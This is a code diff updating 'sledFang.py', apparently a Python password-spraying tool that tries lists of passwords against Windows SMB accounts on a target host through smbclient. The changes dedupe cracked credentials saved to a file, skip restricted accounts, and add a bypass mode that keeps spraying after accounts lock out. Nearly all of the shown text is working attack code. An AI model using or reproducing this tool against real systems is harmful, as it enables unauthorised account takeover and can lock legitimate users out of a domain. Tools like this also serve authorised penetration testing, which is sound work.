@@ -1,12 +1,14 @@
 #! python3
-# sledFang.py -v 1.1
+# sledFang.py -v 1.2
 # Author- David Sullivan
 #
 # Use smbclient to password spray against a device
 #
 # Revision  1.0     -   07/09/2018- Initial creation of script
 # Revision  1.1     -   04/24/2019- Added rate limiting and delays, logic for reset connections, renamed to 'sledFang',
-#                                   added verbosity as well. 
+#                                   added verbosity as well.
+# Revision  1.2     -   06/03/2019- Added new false positive, updated output to not write duplicates, added logic to
+#                                   not continue spraying against locked out account when the bypass option is used.
 #
 # Example Usage:
 # python3 sledFang.py -d domain -u user -p password -t 127.0.0.1 -o output.txt
@@ -16,9 +18,16 @@ import subprocess, argparse, time
 
 
 def write_output(user, password, output):
-    # open the file and write to it
+    # create an empty list to store credentials and a variable for the new credential
+    creds = list()
+    new_cred = '%s:%s\n' % (user, password)
+
+    # open the output file, check to see if the new credential has already been found, if not, add to file
     file = open(output, 'a+')
-    file.write('%s:%s\n' % (user, password))
+    for cred in file:
+        creds.append(cred)
+    if new_cred not in creds:
+        file.write(new_cred)
     file.close()
 
 
@@ -78,15 +87,23 @@ def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_li
             elif answer == "session setup failed: NT_STATUS_ACCOUNT_DISABLED\n":
                 print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
                 temp_users.remove(user)
-            # check to see if the account has been locked out, if so, stop spraying to not lock out the whole domain
+            # check to see if the account is restricted if so, print out the account and remove from spraying list
+            elif answer == "session setup failed: NT_STATUS_ACCOUNT_RESTRICTION\n":
+                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
+                temp_users.remove(user)
+            # check to see if the account has been locked out, if so
             elif answer == "session setup failed: NT_STATUS_ACCOUNT_LOCKED_OUT\n":
                 print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
                 user_diff = set(user_list_clean) - set(temp_users)
+                # check to see if the bypass flag is set, if not, stop spraying
                 if bypass is not True:
                     print('Stopping script due to account lockout')
                     print('The following accounts are expired, disabled or cracked:')
                     print(user_diff)
                     quit()
+                # if the bypass flag is set, remove the locked out account from the spraying queue
+                else:
+                    temp_users.remove(user)
             # if logon fails, drop the response, any other response, print to screen and remove account from spraying
             elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
                 if answer != "session setup failed: NT_STATUS_ACCESS_DENIED\n":
